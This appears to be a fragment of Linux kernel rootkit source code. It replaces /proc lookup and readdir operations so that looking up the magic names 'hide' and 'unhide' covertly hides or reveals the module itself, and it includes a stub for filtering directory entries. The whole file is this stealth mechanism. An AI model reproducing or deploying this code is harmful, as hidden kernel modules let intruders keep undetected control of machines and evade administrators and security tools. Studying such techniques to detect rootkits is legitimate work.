#include "util.h"
#include "module.h"
#include "hidemod.h"

int new_proc_filldir(void *__buf, const char * name, int namelen, loff_t offset, ino_t ino, unsigned u)
{	
	return 0;
}

struct dentry * new_proc_lookup(struct inode *i, struct dentry *d, struct nameidata *nd)
{
	if(!strcmp(d->d_name.name, "unhide")) {
		printk("My proc lookup called: %s\n", d->d_name.name);
		show_module();
		return NULL;
	} else if( !strcmp(d->d_name.name, "hide")) {
		printk("My proc lookup called: %s\n", d->d_name.name);
		hide_module();
		return NULL;
	} else
		return proc_original_inode_operations.lookup(i, d, nd);
}

int new_proc_readdir(struct file *a, void *b, filldir_t c)
{
	return proc_original_file_operations.readdir(a, b, c);
}
